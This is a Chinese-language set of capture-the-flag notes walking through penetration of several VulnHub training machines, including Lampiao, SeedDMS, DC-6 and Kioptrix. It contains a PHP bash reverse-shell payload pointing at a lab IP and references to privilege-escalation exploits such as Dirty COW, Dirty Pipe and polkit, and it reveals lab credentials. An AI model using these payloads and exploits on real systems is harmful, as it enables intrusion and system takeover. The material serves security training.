#### Lampiao
使用nmap半开放扫描全端口
![[Pasted image 20231222113722.png]]
详细扫描发现1898才是有东西的网站
![[Pasted image 20231222113901.png]]
扫描后台发现rotos.txt
![[Pasted image 20231222114116.png]]
收集信息发现框架版本号
![[Pasted image 20231222114247.png]]
![[Pasted image 20231222114229.png]]
搜索searchsploit看看有没有漏洞
![[Pasted image 20231222114417.png]]
查看44557.rb进入msf搜索漏洞模块![[Pasted image 20231222143911.png]]
![[Pasted image 20231222144042.png]]
设置好端口，ip，和target 就渗透成功了
![[Pasted image 20231222144832.png]]
查看内核版本发现是16年的存在脏牛漏洞
尝试渗透
可惜这个用户不行要本地用户
![[Pasted image 20231222151447.png]]
查看home目录发现用户名字
![[Pasted image 20231222152018.png]]
然后再用cewl把网站的信息收集为密码进行爆破
![[Pasted image 20231222152235.png]]
爆破成功![[Pasted image 20231222152436.png]]
使用脚本![[Pasted image 20231222152547.png]]
成功提权
找到flag
![[Pasted image 20231222152611.png]]
#### **driftingblues9**

靶机就开了80和111，80端口有个登录但是我用burp收集到的信息应该可能是web框架

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image1.png){width="5.760416666666667in"
height="3.435564304461942in"}

果然轻轻松松拿到shell

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image2.png){width="5.760416666666667in"
height="2.954714566929134in"}

登录成功直接出密码

\<?php

// DATABASE CONNECTION INFORMATION

define(\'DATABASE_HOST\', \'localhost\'); // Database host

define(\'DATABASE_NAME\', \'microblog\'); // Name of the database to be
used

define(\'DATABASE_USERNAME\', \'clapton\'); // User name for access to
database

define(\'DATABASE_PASSWORD\', \'yaraklitepe\'); // Password for access
to database

define(\'DB_ENCRYPT_KEY\', \'p52plaiqb8\'); // Database encryption key

define(\'DB_PREFIX\', \'mb101\_\'); // Unique prefix of all table names
in the database

?\>

nc反弹成功，之前一直没成功，可能是忘记了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image3.png){width="5.760416666666667in"
height="2.410982064741907in"}

python切换

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image4.png){width="5.760416666666667in"
height="2.22540791776028in"}

得到flag

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image5.png){width="4.291666666666667in"
height="1.1666666666666667in"}

这个提示应该是和提权有关系

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image6.png){width="5.760416666666667in"
height="1.8736307961504812in"}

提权失败感觉这个input文件有点奇怪

#### **Ubuntu_CTF(SeedDMS)**

只开启80和3306端口

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image7.png){width="5.760416666666667in"
height="1.9983672353455817in"}

3306还对爆破做了控制

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image8.png){width="5.760416666666667in"
height="2.391235783027122in"}

只能从80端口找猫腻了

一没网站框架，二没子目录，三没可疑文件，透露的信息少之又少，所以只能打开burp抓包分析他的网站那些js代码了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image9.png){width="5.760416666666667in"
height="3.7146609798775154in"}

找到个子目录访问得到seedDMS网站框架

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image10.png){width="5.760416666666667in"
height="2.8156299212598426in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image11.png){width="5.760416666666667in"
height="0.5832874015748032in"}

必须登录才能办事，所以我用cewl工具收集了信息进行密码用户爆破但是太多了根本不行

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image12.png){width="5.760416666666667in"
height="4.433934820647419in"}

只能去寻找密码了（无果）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image13.png){width="5.760416666666667in"
height="4.526437007874016in"}

百度说在conf/settings.xml 里面有密码和用户真够狗（信息收集我还是太弱了）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image14.png){width="5.760416666666667in"
height="4.104822834645669in"}

登录成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image15.png){width="5.760416666666667in"
height="1.754780183727034in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image16.png){width="5.760416666666667in"
height="3.572853237095363in"}

登录失败

查看其他也标有user字样的目录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image17.png){width="5.760416666666667in"
height="1.1484831583552055in"}

发现admin的md5值

换了几个md5解码网站终于解码失败

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image18.png){width="5.760416666666667in"
height="2.6098764216972876in"}

修改admin密码然后上传

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image19.png){width="5.760416666666667in"
height="1.8579374453193351in"}

kali数据库太麻烦了直接选择 navicat下载图像化的才像样

<https://blog.csdn.net/m0_46829545/article/details/130172140>

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image20.png){width="5.760416666666667in"
height="6.270410104986877in"}

特别方便

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image21.png){width="5.760416666666667in"
height="4.365259186351706in"}

登录成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image22.png){width="5.760416666666667in"
height="3.360242782152231in"}

查看版本信息

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image23.png){width="5.760416666666667in"
height="3.1645494313210847in"}

版本都太高不能行了

发现文件上传

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image24.png){width="5.760416666666667in"
height="3.0006539807524057in"}

上传成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image25.png){width="5.760416666666667in"
height="3.056971784776903in"}

找不到位置我们就扫

扫描工具太啦了，又没扫到

\\seeddms51x\\data\\1048576\\(文件序号)\\1.php**(你上传的文件会被重命名为
1.php)，**其中文件序号在后台的文档信息中的序号相对应

终于成功了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image26.png){width="5.760416666666667in"
height="1.9656758530183727in"}

使用weevely生成木马反弹成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image27.png){width="5.760416666666667in"
height="2.521926946631671in"}

权限实在太低

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image28.png){width="4.069444444444445in"
height="0.8013998250218722in"}

我们之前得到了saket的密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image29.png){width="5.760416666666667in"
height="1.5989774715660543in"}

查看发现他可以bash

这时候只能从网页上试试权限了，木马反弹的不太行

这里要在后面加分号才行

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image30.png){width="5.760416666666667in"
height="1.0226027996500437in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image31.png){width="5.760416666666667in"
height="1.064025590551181in"}

bash反弹成功

\<?php system(\"bash -c \'bash -i \>& /dev/tcp/172.16.123.108/7777
0\>&1\'\");?\>

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image32.png){width="5.760416666666667in"
height="2.7516272965879267in"}

很明显这个可以了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image33.png){width="5.760416666666667in"
height="0.7019860017497813in"}

登录成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image34.png){width="5.760416666666667in"
height="1.2648534558180227in"}

sudo su提权成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image35.png){width="5.760416666666667in"
height="1.2648534558180227in"}

#### **drippingblues（CVE-2021-4034 [polkit授权管理器 漏洞]{.mark}）**

ftp匿名登录发现zip

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image36.png){width="5.760416666666667in"
height="2.69000656167979in"}

john 爆破成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image37.png){width="5.760416666666667in"
height="3.1952318460192477in"}

得到提示

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image38.png){width="5.760416666666667in"
height="1.7701793525809273in"}

首页发现一点点提示

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image39.png){width="5.760416666666667in"
height="1.265741469816273in"}

robots.txt泄漏

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image40.png){width="5.760416666666667in"
height="4.259137139107612in"}

第一个文件给了个密码破解一样的提示

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image41.png){width="5.760416666666667in"
height="2.2072626859142606in"}

第二个提示应该是关于提权的，这么多提示真的是草了

解析参考发现这个drip是文件包含，可惜没想到发现密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image42.png){width="2.138888888888889in"
height="0.7512193788276466in"}

#### imdrippinbiatch

再把之前从主页得到的用户名类似的跑一下这个密码登录成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image43.png){width="5.486111111111111in"
height="4.007880577427821in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image44.png){width="5.027777777777778in"
height="0.5632775590551181in"}

提权：脏管道行不通

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image45.png){width="5.760416666666667in"
height="2.1679833770778654in"}

CVE-2022-4034

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image46.png){width="5.760416666666667in"
height="1.0406856955380577in"}

这里给的两个链接的都不是很好因为靶机没有make,只能运行个python
或者编译好C和shell

所以百度看看其他的exp有没有符合我们要求的（找到了但是靶机有问题）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image47.png){width="5.760416666666667in"
height="3.0110104986876642in"}

提权失败

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image48.png){width="5.760416666666667in"
height="2.6747670603674543in"}

重新导入靶机

第一次没成功第二次加满权限成功了

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image49.png)
height="1.4447747156605424in"}

破靶机

#### **Breakout（getcap查看文件功能）**

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image50.png){width="5.760416666666667in"
height="2.949113079615048in"}

首先查看smb服务是否有关键信息

并没有发现

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image51.png){width="4.194444444444445in"
height="1.4398840769903762in"}

直接扫80后台

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image52.png){width="5.760416666666667in"
height="3.3444674103237095in"}

没发现什么好东西

在主页查看源码发现信息

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image53.png){width="5.760416666666667in"
height="0.8068055555555556in"}

这是密码学里面的一种加密

解码网页：<https://www.splitbrain.org/services/ook>

解码得到.2uqPEfj3D\<P\'a-3

接着访问10000和20000发现是两个不一样的登录网页

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image54.png){width="5.760416666666667in"
height="3.8539654418197724in"}

所以我们先收集用户名

enum4linux IP

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image55.png){width="5.760416666666667in"
height="1.0239271653543307in"}

收集到cyber用户,然后使用之前的密码登录

10000登录不行

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image56.png){width="5.760416666666667in"
height="3.064867672790901in"}

20000可以

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image57.png){width="5.760416666666667in"
height="3.0776804461942255in"}

找到语言改成中文

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image58.png){width="5.760416666666667in"
height="3.1529188538932633in"}

发现终端,使用 bash反弹成功，从它没开22端口我就知道他是要反弹

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image59.png){width="5.760416666666667in"
height="1.6188035870516186in"}

查看内核发现可能有脏管道漏洞（CVE-2022-0847）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image60.png){width="5.760416666666667in"
height="1.958542213473316in"}

还是用脚本跑一下看看没发现什么特别漏洞，倒是发现这个目录下有些好东西

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image61.png){width="5.760416666666667in"
height="4.027450787401575in"}

密码备份可惜要root权限

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image62.png){width="5.760416666666667in"
height="1.1009667541557306in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image63.png){width="4.305555555555555in"
height="0.7610301837270341in"}

查看tar发现是个可执行文件所以使用getcap工具查看：[getcap
可以获得程序文件所具有的能力 (CAP).]{.mark}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image64.png){width="3.861111111111111in"
height="0.8452701224846895in"}

发现他有读取的功能

按照他的help提示得到如下

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image65.png){width="5.760416666666667in"
height="1.7466688538932633in"}

Ts&4&YurgtRX(=\~h 这个就是root密码

成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image66.png){width="5.569444444444445in"
height="1.1681233595800524in"}

#### **matrix-breakout-2-morp（CVE-2022-0847脏管道）**

使用dirb扫描目录根本没东西，百度使用gobuster工具扫终于发现了可疑文件

gobuster dir -u http://172.16.123.106 -x php,bak,html,txt -w
/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image67.png){width="5.760416666666667in"
height="3.8402777777777777in"}

打开文件发现是一个可以写入的php所以先抓包测试一下。

发现可以在post改掉它输入的文字最后保存地址

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image68.png){width="5.760416666666667in"
height="1.5609623797025372in"}

访问phpinfo.php果然成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image69.png){width="5.760416666666667in"
height="3.620696631671041in"}

写入执行命令木马后，信息收集发现flag1

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image70.png){width="5.760416666666667in"
height="1.0896784776902888in"}

提示很重要

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image71.png){width="5.760416666666667in"
height="1.3245505249343832in"}

查看passwd文件分析用户

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image72.png){width="3.6944444444444446in"
height="0.7722845581802275in"}

可能就是找密码然后登录后提权了。

按照翻译后的提示找到这个照片

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image73.png){width="5.760416666666667in"
height="3.2909765966754154in"}

分析里面有没有密码(无果)

使用网上的后渗透脚本批量跑发现一个脏牛一样的漏洞可以使用

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image74.png){width="5.760416666666667in"
height="4.908933727034121in"}

使用不成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image75.png){width="4.902777777777778in"
height="1.0097014435695537in"}

百度搜索漏洞其他的利用方法

git clone
[[https://github.com/imfiver/CVE-2022-0847.git]{.underline}](https://github.com/imfiver/CVE-2022-0847.git)

发现和还有脚本，使用看看

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image76.png){width="5.760416666666667in"
height="1.8739818460192477in"}

终于提取成功了，

接着信息收集，发现之前那个81端口是用nginx搭建的所以我们看看nginx是不是有东西

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image77.png){width="5.760416666666667in"
height="2.7943000874890638in"}

终于发现密码开始爆破，那个照片居然没什么用真坑。

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image78.png){width="5.760416666666667in"
height="2.1021423884514436in"}

半天爆破不出。

#### **DC-6 （WordPress爆破，Activity monitor插件漏洞）**

信息收集：

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image79.png){width="5.760416666666667in"
height="2.9754221347331584in"}

发现有wp-admin说明是wordpress框架

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image80.png){width="5.760416666666667in"
height="6.347595144356956in"}

网页访问是错误的，发现是wordy，说明是要改host，重定向。

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image81.png){width="5.760416666666667in"
height="3.2355850831146107in"}

修改hosts

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image82.png){width="5.760416666666667in"
height="3.2355850831146107in"}

弱密码行不通

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image83.png){width="5.760416666666667in"
height="4.485516185476816in"}

使用wpscan扫用户名

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image84.png){width="5.263888888888889in"
height="3.4501924759405074in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image85.png){width="5.760416666666667in"
height="3.2355850831146107in"}

制作用户本

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image86.png){width="2.138888888888889in"
height="1.2102985564304463in"}

跑密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image87.png){width="5.760416666666667in"
height="4.8570122484689415in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image88.png){width="5.760416666666667in"
height="3.2355850831146107in"}

爆破成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image89.png){width="5.760416666666667in"
height="5.7096325459317585in"}

使用（wp_admin_shell渗透）并未成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image90.png){width="5.760416666666667in"
height="5.087724190726159in"}

试试看从靶机网页上找Activity monitor插件漏洞

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image91.png){width="5.760416666666667in"
height="3.9935192475940506in"}

搜索插件

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image92.png){width="5.760416666666667in"
height="1.0553116797900262in"}

渗透得shell

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image93.png){width="5.760416666666667in"
height="2.274499125109361in"}

提权信息搜集发现

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image94.png){width="5.760416666666667in"
height="1.864212598425197in"}

发现密码和用户

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image95.png){width="4.819444444444445in"
height="0.9680522747156606in"}

sudo -l 发现graham有 backups.sh的使用权限

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image96.png){width="5.760416666666667in"
height="1.2349792213473316in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image97.png){width="4.819444444444445in"
height="1.8672736220472441in"}

但是发现不对，百度发现要转换身份

转换身份：

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image98.png){width="3.4027777777777777in"
height="1.477658573928259in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image99.png){width="5.760416666666667in"
height="0.9117202537182852in"}

sudo -l 发现namp提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image100.png){width="5.760416666666667in"
height="1.203429571303587in"}

使用普通的根本行不通

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image101.png){width="4.486111111111111in"
height="0.7198643919510062in"}

使用msfconsole提权的也行不通，反弹不了，只能使用脚本的方法提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image102.png){width="5.760416666666667in"
height="2.7979166666666666in"}

提权成功（一定要sudo在前面）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image103.png){width="5.760416666666667in"
height="0.9600699912510936in"}

#### **My_file_server(ssh私钥上传)**

使用nmap扫服务和漏洞发现开启了smb服务像这种靶机不太可能存在系统漏洞所以可以直接放弃

使用nikto扫80网站发现txt打开就是密码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image104.png){width="5.760416666666667in"
height="1.4901946631671041in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image105.png){width="5.760416666666667in"
height="1.5859055118110237in"}

发现smb服务有guest用户，使用smbclient登录目录查看重要文件

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image106.png){width="4.5in"
height="3.4583333333333335in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image107.png){width="5.760416666666667in"
height="2.7294324146981626in"}

竟然我们得到了密码就说明现在是在找用户名的时候

现在可疑文件翻看用户

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image108.png){width="5.760416666666667in"
height="3.4392497812773404in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image109.png){width="5.760416666666667in"
height="2.938988407699038in"}

ftp登录后发现是home目录，可以放ssh公钥，登录ssh因为ssh只能使用公钥登录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image110.png){width="5.760416666666667in"
height="3.759524278215223in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image111.png){width="5.760416666666667in"
height="1.2842891513560806in"}

连接成功开始提权

查看内核发现符合脏牛的特征

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image112.png){width="3.1666666666666665in"
height="0.6041666666666666in"}

搜索提权文件提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image113.png){width="5.760416666666667in"
height="1.1956277340332457in"}

这两个是我最爱用的两个

使用40616.c提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image114.png){width="4.708333333333333in"
height="1.5104166666666667in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image115.png){width="3.8333333333333335in"
height="2.6354166666666665in"}

#### **[Kioptrix: Level 1（mod_ssl \< 2.8.7）]{.mark}**

漏洞探测使用nmap进行半开放全端口扫描靶机，发现开启了，22,80,443，和一个可疑端口初步分析可能又是网址渗透ssh然后登录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image116.png){width="5.760416666666667in"
height="2.1222583114610676in"}

试试nc -lvn 查看1024端口的消息

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image117.png){width="5.194444444444445in"
height="2.2321511373578304in"}

并无收获

开始对网页信息探索

使用nikto发现test.php

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image118.png){width="5.760416666666667in"
height="2.0374464129483814in"}

80端口吗发现发现可以子目录

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image119.png){width="5.555555555555555in"
height="6.14967738407699in"}

443目录页没任何信息估计是什么插件渗透其中中国mod_ssl很可疑使用searchsploit
查看发现21617.c比较符合

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image120.png){width="5.760416666666667in"
height="0.775090769903762in"}

这个使用kali自带的还不行需要自己去下载才能编译使用

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image121.png){width="3.861111111111111in"
height="1.3529494750656168in"}

使用的时候需要对应版本去使用

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image122.png){width="5.760416666666667in"
height="3.3819870953630797in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image123.png){width="5.055555555555555in"
height="0.1667814960629921in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image124.png){width="4.25in"
height="0.375in"}

使用0x6b

提权成功（修改密码完事）

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image125.png){width="5.760416666666667in"
height="5.627775590551181in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\高职\vulnhub靶机综合渗透/media/image126.png){width="5.760416666666667in"
height="1.4056517935258093in"}

或者使用msfconsole自带的模块攻击

